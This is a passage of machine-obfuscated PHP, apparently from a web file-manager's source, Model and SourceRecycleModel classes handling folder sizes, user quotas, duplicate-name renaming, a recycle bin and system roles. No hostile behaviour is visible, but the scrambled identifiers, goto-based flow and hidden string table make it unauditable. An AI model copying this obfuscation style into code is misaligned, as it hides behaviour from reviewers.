$bô²íš×Ÿï); CacheLock::unlock($ešËÒàáòÎ); $this->targetSpaceUpdate($bÚÅí­ª¶Ü[$BÜùÕ¤ÙÁ˜[389]], $bÚÅí­ª¶Ü[$BÜùÕ¤ÙÁ˜[474]]); goto a¿ß÷òŒ; EöêÏÙŠô×: $BÜùÕ¤ÙÁ˜ =& $_SERVER[Æ¼ôºÙï]; if ($this->statusIgnoreResetSpace) { return; } $bÚÅí­ª¶Ü = $this->sourceInfo($fÓÏ×…); goto B±ÓÀéæ¦; BŠ†ÔÀÜÌ: if ($bô²íš×Ÿï == 0) { return CacheLock::unlock($ešËÒàáòÎ); } $d’­ˆÕù¥š = $this->parentLevelArray($bÚÅí­ª¶Ü[$BÜùÕ¤ÙÁ˜[477]]); if (!$d’­ˆÕù¥š) { $d’­ˆÕù¥š = array(); } goto DÕìÈ™å; DÕìÈ™å: $d’­ˆÕù¥š[] = $bÚÅí­ª¶Ü[$BÜùÕ¤ÙÁ˜[387]]; $DÇ¡Ö¾¸‚‚ = array($BÜùÕ¤ÙÁ˜[387] => array($BÜùÕ¤ÙÁ˜[402], $d’­ˆÕù¥š)); if ($bô²íš×Ÿï < 0) { $DÇ¡Ö¾¸‚‚[$BÜùÕ¤ÙÁ˜[77]] = array($BÜùÕ¤ÙÁ˜[951], abs($bô²íš×Ÿï)); } goto Eøç‹ù’Ò; a¿ß÷òŒ: } public function folderSizeResetChildren($B¡áŠšƒ­ò) { goto E–¼ĞÇŒÄ‰; FßùˆÔ™î½: foreach ($BĞçò³ê…† as $d§«”¨÷) { $bÏåå‘’ÊÇ = $d§«”¨÷[$CÒÕÀ»Ìí[479]] . $CÒÕÀ»Ìí[33]; if (!isset($a·ÖµÉŠ«Œ[$bÏåå‘’ÊÇ])) { continue; } if ($d§«”¨÷[$CÒÕÀ»Ìí[414]] == $a·ÖµÉŠ«Œ[$bÏåå‘’ÊÇ][$CÒÕÀ»Ìí[414]]) { $a·ÖµÉŠ«Œ[$bÏåå‘’ÊÇ][$CÒÕÀ»Ìí[77]] += $d§«”¨÷[$CÒÕÀ»Ìí[77]]; } } foreach ($a·ÖµÉŠ«Œ as $d§«”¨÷) { $fÅ‡¢ï³¥£ = $this->parentLevelArray($d§«”¨÷[$CÒÕÀ»Ìí[477]]); foreach ($fÅ‡¢ï³¥£ as $bÏåå‘’ÊÇ) { $bÏåå‘’ÊÇ = $bÏåå‘’ÊÇ . $CÒÕÀ»Ìí[33]; if (!isset($a·ÖµÉŠ«Œ[$bÏåå‘’ÊÇ])) { continue; } if ($d§«”¨÷[$CÒÕÀ»Ìí[414]] == $a·ÖµÉŠ«Œ[$bÏåå‘’ÊÇ][$CÒÕÀ»Ìí[414]]) { $a·ÖµÉŠ«Œ[$bÏåå‘’ÊÇ][$CÒÕÀ»Ìí[77]] += $d§«”¨÷[$CÒÕÀ»Ìí[77]]; } } } $eˆ“ùßÀÇ¦ = array(); goto e±÷Ú—©âŞ; cÁòÛ™¹­Š: $BÅÙ°¬ÒôÍ = array($CÒÕÀ»Ìí[535] => 1, $CÒÕÀ»Ìí[542] => array($CÒÕÀ»Ìí[501], $D³ÏÁëàˆ­[$CÒÕÀ»Ìí[477]] . $B¡áŠšƒ­ò . $CÒÕÀ»Ìí[502])); $Fù„Ó½¤øï = $CÒÕÀ»Ìí[1950]; $a·ÖµÉŠ«Œ = $this->field($Fù„Ó½¤øï)->where($BÅÙ°¬ÒôÍ)->select(); goto BÜŞ¸“³à‡; E–¼ĞÇŒÄ‰: $CÒÕÀ»Ìí =& $_SERVER[Æ¼ôºÙï]; $this->sourceCacheClear($B¡áŠšƒ­ò); $D³ÏÁëàˆ­ = $this->sourceInfo($B¡áŠšƒ­ò); goto cÁòÛ™¹­Š; BÜŞ¸“³à‡: $BÅÙ°¬ÒôÍ[$CÒÕÀ»Ìí[388]] = 0; $BĞçò³ê…† = $this->field($Fù„Ó½¤øï)->where($BÅÙ°¬ÒôÍ)->select(); if (!$BĞçò³ê…†) { return; } goto FŸë›Õ”¶; e±÷Ú—©âŞ: foreach ($a·ÖµÉŠ«Œ as $d§«”¨÷) { if ($d§«”¨÷[$CÒÕÀ»Ìí[77]] == $d§«”¨÷[$CÒÕÀ»Ìí[1951]]) { continue; } $eˆ“ùßÀÇ¦[] = array($CÒÕÀ»Ìí[387], $d§«”¨÷[$CÒÕÀ»Ìí[387]], $CÒÕÀ»Ìí[77], $d§«”¨÷[$CÒÕÀ»Ìí[77]]); } $this->saveAll($eˆ“ùßÀÇ¦); goto D…½Ëâ›; FŸë›Õ”¶: $a·ÖµÉŠ«Œ[] = $D³ÏÁëàˆ­; $a·ÖµÉŠ«Œ = array_to_keyvalue($a·ÖµÉŠ«Œ, $CÒÕÀ»Ìí[387]); foreach ($a·ÖµÉŠ«Œ as $aˆù±íôŠ => $d§«”¨÷) { $a·ÖµÉŠ«Œ[$aˆù±íôŠ][$CÒÕÀ»Ìí[1951]] = $a·ÖµÉŠ«Œ[$aˆù±íôŠ][$CÒÕÀ»Ìí[77]]; $a·ÖµÉŠ«Œ[$aˆù±íôŠ][$CÒÕÀ»Ìí[77]] = 0; } goto FßùˆÔ™î½; D…½Ëâ›: } public function userSpaceReset($d¯øÂÒÄÚ§ = false) { $DİĞ…Ã‘ô =& $_SERVER[Æ¼ôºÙï]; $B’×š»äå‡ = $this->where(array($DİĞ…Ã‘ô[389] => self::TYPE_USER, $DİĞ…Ã‘ô[474] => $d¯øÂÒÄÚ§, $DİĞ…Ã‘ô[388] => 0))->sum($DİĞ…Ã‘ô[77]); Model($DİĞ…Ã‘ô[492])->userEdit($d¯øÂÒÄÚ§, array($DİĞ…Ã‘ô[1647] => $B’×š»äå‡)); } public function targetSpaceUpdate($bôÔëƒÕ, $A—À¤ØÚ¤Å) { $FÆ•Õ¤÷» =& $_SERVER[Æ¼ôºÙï]; if (!$A—À¤ØÚ¤Å) { return; } if (!in_array($bôÔëƒÕ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $EİÏ¢Òî©Ô = $this->targetSpaceSize($bôÔëƒÕ, $A—À¤ØÚ¤Å); if ($bôÔëƒÕ == self::TYPE_USER) { Model($FÆ•Õ¤÷»[492])->userEdit($A—À¤ØÚ¤Å, array($FÆ•Õ¤÷»[1647] => $EİÏ¢Òî©Ô)); } else { if ($bôÔëƒÕ == self::TYPE_GROUP) { Model($FÆ•Õ¤÷»[476])->groupEdit($A—À¤ØÚ¤Å, array($FÆ•Õ¤÷»[1647] => $EİÏ¢Òî©Ô)); } } } public function targetSpaceSize($D½ìÈ¤„ÒŠ, $EßÙ²ø†êĞ) { goto aŸ»œœô; c†¨°Ü¥“Õ: return $däò‘‡ÜŠê; goto f«Œ—ø¡œÂ; aŸ»œœô: $dø×øËíùº =& $_SERVER[Æ¼ôºÙï]; $b¯©Òñ‰ç = $this->sourceRoot($D½ìÈ¤„ÒŠ, $EßÙ²ø†êĞ, !0); if (!$b¯©Òñ‰ç) { return 0; } goto Aª¼ŸÚÉ©Á; EƒŒ›í”¬ª: $bçÓÒ‹”‡» = array_to_keyvalue($bçÓÒ‹”‡», $dø×øËíùº[33], $dø×øËíùº[387]); $bçÓÒ‹”‡» = array_unique(array_filter($bçÓÒ‹”‡»)); if ($bçÓÒ‹”‡») { $Aç…®©ÚÆŠ = array($dø×øËíùº[401] => array($dø×øËíùº[402], $bçÓÒ‹”‡»)); $däò‘‡ÜŠê += floatval($this->where($Aç…®©ÚÆŠ)->sum($dø×øËíùº[77])); } goto c†¨°Ü¥“Õ; Aª¼ŸÚÉ©Á: $däò‘‡ÜŠê = floatval($b¯©Òñ‰ç[$dø×øËíùº[77]]); $Aç…®©ÚÆŠ = array($dø×øËíùº[542] => array($dø×øËíùº[501], $dø×øËíùº[488] . $b¯©Òñ‰ç[$dø×øËíùº[387]] . $dø×øËíùº[502])); $bçÓÒ‹”‡» = Model($dø×øËíùº[412])->field($dø×øËíùº[401])->where($Aç…®©ÚÆŠ)->select(); goto EƒŒ›í”¬ª; f«Œ—ø¡œÂ: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($aóÁáÜ‰ˆº) { return $this->fileTypeProfile($aóÁáÜ‰ˆº, SourceModel::TYPE_USER); } public function groupFileTypeProfile($eÃ˜âãŠ÷Ó) { return $this->fileTypeProfile($eÃ˜âãŠ÷Ó, SourceModel::TYPE_GROUP); } private function fileTypeProfile($dÁº¥èé»Ï, $e‹ˆ‚Ù¿šÚ) { goto D¼µ•‚™Ÿô; F¨µ¥Õ˜¼: foreach ($f•½­ÑØ—¶ as $fšÆª“©ªÖ => $DŒ¨ˆÅÈ) { $FöËØœ—ê¼[$bÎÙƒˆÁÌ½[390]] = $this->fileTypeWhere($fšÆª“©ªÖ); $eò·æß¶‹ï[$fšÆª“©ªÖ] = array($bÎÙƒˆÁÌ½[1954] => $DŒ¨ˆÅÈ[$bÎÙƒˆÁÌ½[28]], $bÎÙƒˆÁÌ½[1955] => $this->where($FöËØœ—ê¼)->count(), $bÎÙƒˆÁÌ½[537] => $this->where($FöËØœ—ê¼)->sum($bÎÙƒˆÁÌ½[77])); } Cache::set($C–ƒ®…‰Ãã, $eò·æß¶‹ï, 1200); return $eò·æß¶‹ï; goto aÕ†½öù‰; CµÛ ª¯ªÅ: if ($däÓ¬»¦‚’) { return $däÓ¬»¦‚’; } $FöËØœ—ê¼ = array($bÎÙƒˆÁÌ½[535] => 0); if ($dÁº¥èé»Ï != !1) { $FöËØœ—ê¼[$bÎÙƒˆÁÌ½[474]] = $dÁº¥èé»Ï; $FöËØœ—ê¼[$bÎÙƒˆÁÌ½[389]] = $e‹ˆ‚Ù¿šÚ; } goto f·‚†ÏÌÊ‡; D¼µ•‚™Ÿô: $bÎÙƒˆÁÌ½ =& $_SERVER[Æ¼ôºÙï]; $C–ƒ®…‰Ãã = $bÎÙƒˆÁÌ½[1952] . $dÁº¥èé»Ï . $bÎÙƒˆÁÌ½[70] . $e‹ˆ‚Ù¿šÚ; $däÓ¬»¦‚’ = Cache::get($C–ƒ®…‰Ãã); goto CµÛ ª¯ªÅ; f·‚†ÏÌÊ‡: $eò·æß¶‹ï = array(); $eò·æß¶‹ï[$bÎÙƒˆÁÌ½[1953]] = array($bÎÙƒˆÁÌ½[1954] => LNG($bÎÙƒˆÁÌ½[1953]), $bÎÙƒˆÁÌ½[1955] => $this->where($FöËØœ—ê¼)->count(), $bÎÙƒˆÁÌ½[537] => $this->where($FöËØœ—ê¼)->sum($bÎÙƒˆÁÌ½[77])); $f•½­ÑØ—¶ = KodIO::fileTypeList(); goto F¨µ¥Õ˜¼; aÕ†½öù‰: } public function fileNameExist($fÍ«—Ÿ´˜¦, $DÑ‡å¹â‘Ø) { $a‘ĞÔ ¾è— =& $_SERVER[Æ¼ôºÙï]; $Cí‡ªÃ¿åÆ = $this->childList($fÍ«—Ÿ´˜¦); foreach ($Cí‡ªÃ¿åÆ as $c¤¾—²ˆ¾¤) { if ($c¤¾—²ˆ¾¤[$a‘ĞÔ ¾è—[28]] == $DÑ‡å¹â‘Ø) { return $c¤¾—²ˆ¾¤[$a‘ĞÔ ¾è—[387]]; } if (strtolower($c¤¾—²ˆ¾¤[$a‘ĞÔ ¾è—[28]]) == strtolower($DÑ‡å¹â‘Ø)) { return $c¤¾—²ˆ¾¤[$a‘ĞÔ ¾è—[387]]; } } return !1; } public function childList($e—²š¨§Øö) { goto c†·ªßĞ¬‚; fù†°Ÿ™: $dÕ˜¥¢‰¿› = array($bÚã˜Óƒõ¬[479] => intval($e—²š¨§Øö), $bÚã˜Óƒõ¬[414] => 0); $CÕÖÚÔõè¹ = $this->where($dÕ˜¥¢‰¿›)->select(); $CÕÖÚÔõè¹ = $CÕÖÚÔõè¹ ? $CÕÖÚÔõè¹ : array(); goto DëÌŠƒ; DëÌŠƒ: self::$cacheChildList[$BâòÒ¯ˆÜ¾] = $CÕÖÚÔõè¹; foreach ($CÕÖÚÔõè¹ as $b‚»ëÅµ¶Ä) { $BâòÒ¯ˆÜ¾ = $bÚã˜Óƒõ¬[427] . $b‚»ëÅµ¶Ä[$bÚã˜Óƒõ¬[387]]; self::$cacheSourceInfo[$BâòÒ¯ˆÜ¾] = $b‚»ëÅµ¶Ä; } return $CÕÖÚÔõè¹; goto DØÇæ¯´Ù; c†·ªßĞ¬‚: $bÚã˜Óƒõ¬ =& $_SERVER[Æ¼ôºÙï]; $BâòÒ¯ˆÜ¾ = $bÚã˜Óƒõ¬[1932] . $e—²š¨§Øö; if (isset(self::$cacheChildList[$BâòÒ¯ˆÜ¾])) { return self::$cacheChildList[$BâòÒ¯ˆÜ¾]; } goto fù†°Ÿ™; DØÇæ¯´Ù: } public function fileNameAuto($e¨­õà–Â², $Fê‹ÑĞÄ®, $eµõˆ’Ğ· = REPEAT_RENAME, $C´í¦ÒóÄÃ = false) { $dÉ—‹ë±†„ =& $_SERVER[Æ¼ôºÙï]; $B´øƒŠ¡« = $this->childList($e¨­õà–Â²); $FÔšèÂóäğ = array_to_keyvalue($B´øƒŠ¡«, $dÉ—‹ë±†„[33], $dÉ—‹ë±†„[28]); return $this->fileNameAutoGet($FÔšèÂóäğ, $Fê‹ÑĞÄ®, $eµõˆ’Ğ·, $C´í¦ÒóÄÃ); } public function fileNameAutoGet($e™ïğ–ò—¢, $cØ¾Ö•‘ª, $FÒ¬İÔ‰»¦, $bµ’·¶êøÎ) { $f¿Ş—Äí©Ø =& $_SERVER[Æ¼ôºÙï]; if ($FÒ¬İÔ‰»¦ == REPEAT_REPLACE || !$e™ïğ–ò—¢ || !in_array_not_case($cØ¾Ö•‘ª, $e™ïğ–ò—¢) || $bµ’·¶êøÎ && $FÒ¬İÔ‰»¦ != REPEAT_RENAME_FOLDER) { return $cØ¾Ö•‘ª; } if ($FÒ¬İÔ‰»¦ == REPEAT_SKIP) { return !1; } $FŒÄ‹ Ş×ä = $f¿Ş—Äí©Ø[94] . get_path_ext($cØ¾Ö•‘ª); $FŒÄ‹ Ş×ä = $FŒÄ‹ Ş×ä == $f¿Ş—Äí©Ø[94] || $bµ’·¶êøÎ ? $f¿Ş—Äí©Ø[33] : $FŒÄ‹ Ş×ä; for ($Cˆ›¯â¼™™ = 1; $Cˆ›¯â¼™™ <= count($e™ïğ–ò—¢) + 1; $Cˆ›¯â¼™™++) { $c§‹Û™…ïö = substr($cØ¾Ö•‘ª, 0, strlen($cØ¾Ö•‘ª) - strlen($FŒÄ‹ Ş×ä)); $CÚ¡ÑöÁŠ = $c§‹Û™…ïö . "\x28{$Cˆ›¯â¼™™}\x29{$FŒÄ‹ Ş×ä}"; if (!in_array_not_case($CÚ¡ÑöÁŠ, $e™ïğ–ò—¢)) { return $CÚ¡ÑöÁŠ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\165\162\143\x65\x5f\162\x65\143\x79\x63\x6c\145"; protected $dataAuto = array(array("\143\162\145\141\164\145\124\151\155\145", "\x74\151\x6d\145", "\151\x6e\x73\x65\162\x74", "\146\165\156\143\164\151\157\156")); public function listData($CĞ¾¹ĞÓï« = false) { $a×Ğê†ö¶ =& $_SERVER[Æ¼ôºÙï]; $CĞ¾¹ĞÓï« = $CĞ¾¹ĞÓï« ? $CĞ¾¹ĞÓï« : USER_ID; $eñÑÛÓ©ä = $this->where(array($a×Ğê†ö¶[1494] => $CĞ¾¹ĞÓï«))->select(); return array_to_keyvalue($eñÑÛÓ©ä, $a×Ğê†ö¶[33], $a×Ğê†ö¶[387]); } public function moveToRecycle($D©ÒªÓ†ËÖ) { goto E¯À§¶ã‹¦; E¯À§¶ã‹¦: $FÆÉÏó’Àœ =& $_SERVER[Æ¼ôºÙï]; $FÑ‹‚Œ ¨ê = Model($FÆÉÏó’Àœ[1182]); $F‰«¿é†É = $FÑ‹‚Œ ¨ê->sourceInfo($D©ÒªÓ†ËÖ); goto cÍéªêÁÎ; cÍéªêÁÎ: if (!$F‰«¿é†É || $F‰«¿é†É[$FÆÉÏó’Àœ[414]] == $FÆÉÏó’Àœ[86]) { return; } $DÅ–½àåÛ = array($FÆÉÏó’Àœ[401] => $D©ÒªÓ†ËÖ, $FÆÉÏó’Àœ[1494] => USER_ID, $FÆÉÏó’Àœ[538] => $F‰«¿é†É[$FÆÉÏó’Àœ[389]], $FÆÉÏó’Àœ[539] => $F‰«¿é†É[$FÆÉÏó’Àœ[474]], $FÆÉÏó’Àœ[542] => $F‰«¿é†É[$FÆÉÏó’Àœ[477]]); $this->add($DÅ–½àåÛ); goto eÖÊ§Ç­‡ã; eÖÊ§Ç­‡ã: $this->recycleMove($D©ÒªÓ†ËÖ, 1); if ($F‰«¿é†É[$FÆÉÏó’Àœ[388]] == $FÆÉÏó’Àœ[86]) { $A«ÁÚÑœ”Ë = array($FÆÉÏó’Àœ[542] => array($FÆÉÏó’Àœ[501], $F‰«¿é†É[$FÆÉÏó’Àœ[477]] . $D©ÒªÓ†ËÖ . $FÆÉÏó’Àœ[502])); $FÑ‹‚Œ ¨ê->where($A«ÁÚÑœ”Ë)->setField($FÆÉÏó’Àœ[414], 1); } goto fšÎ°„İÖ™; fšÎ°„İÖ™: } public function clear() { $this->remove(!1); } public function remove($A¤«ºäˆ = false) { goto E”èµ©‰¤³; E”èµ©‰¤³: $EÁÆ‹ß©Æø =& $_SERVER[Æ¼ôºÙï]; $F¤ññ•à = Model($EÁÆ‹ß©Æø[1182]); $b×Ù“ Ã•Ç = $this->listData(); goto ağ¤“ÚæÓ; ağ¤“ÚæÓ: $A¤«ºäˆ = $A¤«ºäˆ === !1 ? !1 : $A¤«ºäˆ; $BÓ‰•—ªÕİ = array(); foreach ($b×Ù“ Ã•Ç as $EĞïöÓƒ›) { if ($A¤«ºäˆ != !1 && !in_array($EĞïöÓƒ›, $A¤«ºäˆ)) { continue; } $eÄ¤Ò¼ëÁ‡ = $F¤ññ•à->sourceInfo($EĞïöÓƒ›); $F¤ññ•à->remove($EĞïöÓƒ›, !1); $CäËĞ×‘¼Ø = $eÄ¤Ò¼ëÁ‡[$EÁÆ‹ß©Æø[389]] . $EÁÆ‹ß©Æø[70] . $eÄ¤Ò¼ëÁ‡[$EÁÆ‹ß©Æø[474]]; $BÓ‰•—ªÕİ[$CäËĞ×‘¼Ø] = array($EÁÆ‹ß©Æø[538] => $eÄ¤Ò¼ëÁ‡[$EÁÆ‹ß©Æø[389]], $EÁÆ‹ß©Æø[474] => $eÄ¤Ò¼ëÁ‡[$EÁÆ‹ß©Æø[474]]); $this->where(array($EÁÆ‹ß©Æø[387] => $EĞïöÓƒ›))->delete(); } goto b¸³˜É÷¸™; b¸³˜É÷¸™: foreach ($BÓ‰•—ªÕİ as $BòÔ¢Òè¼) { $F¤ññ•à->targetSpaceUpdate($BòÔ¢Òè¼[$EÁÆ‹ß©Æø[389]], $BòÔ¢Òè¼[$EÁÆ‹ß©Æø[474]]); } goto fò¦‰œ½¯µ; fò¦‰œ½¯µ: } public function restore($AØ¨ç¸¬‡ = false) { goto A²‹³Ü¬‘; A²‹³Ü¬‘: $FÃÆŠôß·¤ =& $_SERVER[Æ¼ôºÙï]; $aœ¬¿Ğ®Í = Model($FÃÆŠôß·¤[1182]); $CòÅÅÀï‰ = $this->listData(); goto Aˆ‹À“›“; Aˆ‹À“›“: $AØ¨ç¸¬‡ = $AØ¨ç¸¬‡ == !1 ? !1 : $AØ¨ç¸¬‡; if (!$CòÅÅÀï‰) { return !0; } $dÚ§œÈïµĞ = array(); goto f–®°‘Ä˜Ú; f–®°‘Ä˜Ú: foreach ($CòÅÅÀï‰ as $bˆ¤ƒ†Åö) { goto AŒ½„Ã«Ö¬; bÃ©‘Çà‚Â: $dÚ§œÈïµĞ[] = $aÍĞóîá°[$FÃÆŠôß·¤[479]]; if ($aÍĞóîá°[$FÃÆŠôß·¤[388]] == $FÃÆŠôß·¤[86]) { $dÚ§œÈïµĞ[] = $bˆ¤ƒ†Åö; } $aœ¬¿Ğ®Í->lockMoveEnd($bˆ¤ƒ†Åö); goto bİö†œªíä; FçƒÑŸ“Õ·: if ($a…è´ïÅ¶ã[$FÃÆŠôß·¤[414]] == $FÃÆŠôß·¤[86]) { continue; } $aœ¬¿Ğ®Í->lockMoveStart($bˆ¤ƒ†Åö); $this->recycleMove($bˆ¤ƒ†Åö, 0); goto F´ˆ½öÁ˜ã; AŒ½„Ã«Ö¬: if ($AØ¨ç¸¬‡ != !1 && !in_array($bˆ¤ƒ†Åö, $AØ¨ç¸¬‡)) { continue; } $aÍĞóîá° = $aœ¬¿Ğ®Í->sourceInfo($bˆ¤ƒ†Åö); $a…è´ïÅ¶ã = $aœ¬¿Ğ®Í->sourceInfo($aÍĞóîá°[$FÃÆŠôß·¤[479]]); goto FçƒÑŸ“Õ·; F´ˆ½öÁ˜ã: if ($aÍĞóîá°[$FÃÆŠôß·¤[388]] == $FÃÆŠôß·¤[86]) { $CÙ¨‘›İ×“ = array($FÃÆŠôß·¤[542] => array($FÃÆŠôß·¤[501], $aÍĞóîá°[$FÃÆŠôß·¤[477]] . $bˆ¤ƒ†Åö . $FÃÆŠôß·¤[502])); $aœ¬¿Ğ®Í->where($CÙ¨‘›İ×“)->setField($FÃÆŠôß·¤[414], 0); $this->restoreFolderChildren($bˆ¤ƒ†Åö, $CòÅÅÀï‰); } $this->where(array($FÃÆŠôß·¤[387] => $bˆ¤ƒ†Åö))->delete(); $aœ¬¿Ğ®Í->folderSizeReset($aÍĞóîá°[$FÃÆŠôß·¤[479]]); goto bÃ©‘Çà‚Â; bİö†œªíä: } $aœ¬¿Ğ®Í->updateModifyTime($dÚ§œÈïµĞ); goto eÃÜÜ–òÀŠ; eÃÜÜ–òÀŠ: } private function restoreFolderChildren($dŞ´ŸµÆ, $B‰„º‰–òÁ) { goto E–ç¼°ÕøÁ; cƒÉø‰¬ç: $a…»¿ó¿µ[$C³éÖçŞÍ‘[387]][1] = array_unique($a…»¿ó¿µ[$C³éÖçŞÍ‘[387]][1]); $a…»¿ó¿µ[$C³éÖçŞÍ‘[936]] = $C³éÖçŞÍ‘[1751]; $cƒ«Ê™¿Ä->where($a…»¿ó¿µ)->setField($C³éÖçŞÍ‘[414], 1); goto eîï´øò†; E–ç¼°ÕøÁ: $C³éÖçŞÍ‘ =& $_SERVER[Æ¼ôºÙï]; $cƒ«Ê™¿Ä = Model($C³éÖçŞÍ‘[1182]); $a…»¿ó¿µ = array($C³éÖçŞÍ‘[387] => array($C³éÖçŞÍ‘[7], array())); goto B¨¢Š¢™Òæ; B¨¢Š¢™Òæ: foreach ($B‰„º‰–òÁ as $dáĞßßÒ·‡) { if ($dáĞßßÒ·‡ == $dŞ´ŸµÆ) { continue; } if (!$cƒ«Ê™¿Ä->isParentOf($dŞ´ŸµÆ, $dáĞßßÒ·‡)) { continue; } $eğÍğÁ‡Å = $cƒ«Ê™¿Ä->sourceInfo($dáĞßßÒ·‡); if ($eğÍğÁ‡Å[$C³éÖçŞÍ‘[388]] == $C³éÖçŞÍ‘[86]) { $a…»¿ó¿µ[] = array($C³éÖçŞÍ‘[542] => array($C³éÖçŞÍ‘[501], $eğÍğÁ‡Å[$C³éÖçŞÍ‘[477]] . $dáĞßßÒ·‡ . $C³éÖçŞÍ‘[502])); } else { $a…»¿ó¿µ[$C³éÖçŞÍ‘[387]][1][] = $dáĞßßÒ·‡; } } if (!$a…»¿ó¿µ[$C³éÖçŞÍ‘[387]][1]) { unset($a…»¿ó¿µ[$C³éÖçŞÍ‘[387]]); } if (!$a…»¿ó¿µ) { return; } goto cƒÉø‰¬ç; eîï´øò†: } private function recycleMove($F‹¼±†Ğ¨, $D„ÔÓÏ¸é« = 1) { $Cƒá¡ì÷¿Ü =& $_SERVER[Æ¼ôºÙï]; $bÕª†˜”…Ê = Model($Cƒá¡ì÷¿Ü[1182]); $f•µÃÔêÕÎ = Model($Cƒá¡ì÷¿Ü[1956]); $FÍ”¿É•É‚ = array($Cƒá¡ì÷¿Ü[387] => $F‹¼±†Ğ¨); if ($D„ÔÓÏ¸é«) { $bÕª†˜”…Ê->where($FÍ”¿É•É‚)->setField($Cƒá¡ì÷¿Ü[414], 1); $f•µÃÔêÕÎ->eventRecycle($F‹¼±†Ğ¨, $Cƒá¡ì÷¿Ü[1957]); } else { $AáÀÉö¢ÛÏ = $bÕª†˜”…Ê->where($FÍ”¿É•É‚)->find(); $cÃ§å¤Ê½ù = $AáÀÉö¢ÛÏ[$Cƒá¡ì÷¿Ü[388]] == $Cƒá¡ì÷¿Ü[86]; $D´Åõ¿®² = $bÕª†˜”…Ê->fileNameAuto($AáÀÉö¢ÛÏ[$Cƒá¡ì÷¿Ü[479]], $AáÀÉö¢ÛÏ[$Cƒá¡ì÷¿Ü[28]], REPEAT_RENAME_FOLDER, $cÃ§å¤Ê½ù); if ($D´Åõ¿®² != $AáÀÉö¢ÛÏ[$Cƒá¡ì÷¿Ü[28]]) { $bÕª†˜”…Ê->rename($F‹¼±†Ğ¨, $D´Åõ¿®²); } $bÕª†˜”…Ê->where($FÍ”¿É•É‚)->setField($Cƒá¡ì÷¿Ü[414], 0); $f•µÃÔêÕÎ->eventRecycle($F‹¼±†Ğ¨, $Cƒá¡ì÷¿Ü[1958]); } } } goto AÚëƒÛ²Ãè; bƒßƒ…†‚: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\56\x72\157\x6c\145\x4c\x69\x73\x74"; public $field = array("\x6e\x61\155\x65", "\x61\x75\x74\150", "\154\x61\142\145\x6c", "\144\x69\163\x70\x6c\141\171", "\163\171\163\164\x65\155", "\x64\145\163\x63", "\151\x67\x6e\x6f\x72\x65\105\x78\x74", "\x69\x67\156\157\x72\145\106\151\x6c\145\x53\151\172\x65", "\141\144\155\x69\156\151\163\x74\162\141\164\x6f\x72", "\163\157\162\164"); public function listData($fË¯ŸŞ©ì = false, $dïï÷†÷‚– = "\163\157\162\x74", $aëÌšá× = false) { $C—Ö¤‡¨­Å =& $_SERVER[Æ¼ôºÙï]; $D¦Û…Ã×” = parent::listData($fË¯ŸŞ©ì, $dïï÷†÷‚–, $aëÌšá×); if (!$fË¯ŸŞ©ì) { $cùñ›Œà‘İ = $C—Ö¤‡¨­Å[2069]; foreach ($D¦Û…Ã×” as $fŸôÊÓ¸í• => $a´„Î²ò) { if ($a´„Î²ò[$C—Ö¤‡¨­Å[1852]] == 1) { $D¦Û…Ã×”[$fŸôÊÓ¸í•][$C—Ö¤‡¨­Å[422]] = $cùñ›Œà‘İ; } } } return $D¦Û…Ã×”; } public function update($F¾‡Ûˆƒé, $c„àƒ…×§) { goto aÑ†Ï©…Ú; c…Í…ÎÂË¼: if (!$BŸºº®§·Ù || $aŸ²•¶é¹Á && $aŸ²•¶é¹Á[$f¥î´¡íœÔ[385]] != $BŸºº®§·Ù[$f¥î´¡íœÔ[385]]) { return !1; } if ($aŸ²•¶é¹Á[$f¥î´¡íœÔ[1852]] == 1) { $c„àƒ…×§ = array($f¥î´¡íœÔ[28] => $c„àƒ…×§[$f¥î´¡íœÔ[28]], $f¥î´¡íœÔ[1682] => $c„àƒ…×§[$f¥î´¡íœÔ[1682]]); } $this->filterAuth($c„àƒ…×§[$f¥î´¡íœÔ[394]]); goto f—ŸñÑƒ·; f—ŸñÑƒ·: return parent::update($F¾‡Ûˆƒé, $c„àƒ…×§); goto EÌî ß†ë; aÑ†Ï©…Ú: $f¥î´¡íœÔ =& $_SERVER[Æ¼ôºÙï]; $BŸºº®§·Ù = parent::listData($F¾‡Ûˆƒé); $aŸ²•¶é¹Á = $this->findByName($c„àƒ…×§[$f¥î´¡íœÔ[28]]); goto c…Í…ÎÂË¼; EÌî ß†ë: } public function remove($fÏ¼ÛøĞ“®) { $E¸¿Ñ‚»¡˜ = parent::listData($fÏ¼ÛøĞ“®); if (!$E¸¿Ñ‚»¡˜ || $E¸¿Ñ‚»¡˜[$_SERVER[Æ¼ôºÙï][1146]]) { return !1; } return parent::remove($fÏ¼ÛøĞ“®); } public function add($CÉÖº‘®‹) { goto FÇÓÔ¢ÑŒ; FÇÓÔ¢ÑŒ: $Eä‡éÉåìŞ =& $_SERVER[Æ¼ôºÙï]; $fø¼§½ù³Ü = $CÉÖº‘®‹[$Eä‡éÉåìŞ[28]]; if ($this->findByName($fø¼§½ù³Ü)) { return !1; } goto B½‰¢®£…; B½‰¢®£…: $cÏåìÚÒ²¶ = array($Eä‡éÉåìŞ[404] => $fø¼§½ù³Ü, $Eä‡éÉåìŞ[1667] => $Eä‡éÉåìŞ[33], $Eä‡éÉåìŞ[1663] => $Eä‡éÉåìŞ[1671], $Eä‡éÉåìŞ[2070] => 1, $Eä‡éÉåìŞ[1666] => 0, $Eä‡éÉåìŞ[2071] => 0, $Eä‡éÉåìŞ[1665] => $this->getSort()); $CÉÖº‘®‹ = array_merge($cÏåìÚÒ²¶, $CÉÖº‘®‹); $this->filterAuth($CÉÖº‘®‹[$Eä‡éÉåìŞ[394]]); goto DÔËá·¦—î; DÔËá·¦—î: return parent::insert($CÉÖº‘®‹); goto Dƒ÷ÌèˆºÆ; Dƒ÷ÌèˆºÆ: } private function getSort() { $e æ£ÆÚóÆ =& $_SERVER[Æ¼ôºÙï]; $fÂŞ˜óŞÔ· = parent::listData(); $b£êÊÄèÔ = array_to_keyvalue($fÂŞ˜óŞÔ·, $e æ£ÆÚóÆ[33], $e æ£ÆÚóÆ[1684]); return empty($b£êÊÄèÔ) ? 0 : max($b£êÊÄèÔ) + 1; } private function filterAuth(&$b™Ì‡ÍèÕ) { $CÌ¾šñ¸ù =& $_SERVER[Æ¼ôºÙï]; $AÈè¼èÔñ = array(); $C±—‰š˜Ç© = array_filter(explode($CÌ¾šñ¸ù[47], 